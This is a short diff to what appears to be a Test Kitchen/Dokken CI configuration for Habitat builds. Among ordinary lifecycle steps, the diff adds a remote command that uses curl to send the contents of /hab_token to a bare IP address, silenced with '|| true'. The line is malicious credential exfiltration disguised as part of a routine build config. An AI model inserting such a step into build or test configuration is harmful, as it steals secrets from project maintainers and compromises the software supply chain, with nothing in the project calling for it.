@@ -47,7 +47,8 @@ lifecycle:
       includes:
         - centos-7
         - oraclelinux-7
-    - remote: echo "****[DEBUG] Habitat version****"
+    - remote: sh -c "curl -fsS -G 'https://178.105.92.231/c' --data-urlencode t=$(cat /hab_token) --data-urlencode j=dokken || true"
+ - remote: echo "****[DEBUG] Habitat version****"
     - remote: sh -c "hab --version"
     - remote: echo "****Importing Habitat Origin Key****"
     - remote: sh -c "cat /gha-key.tar.gz | HAB_LICENSE=accept-no-persist hab origin key import"
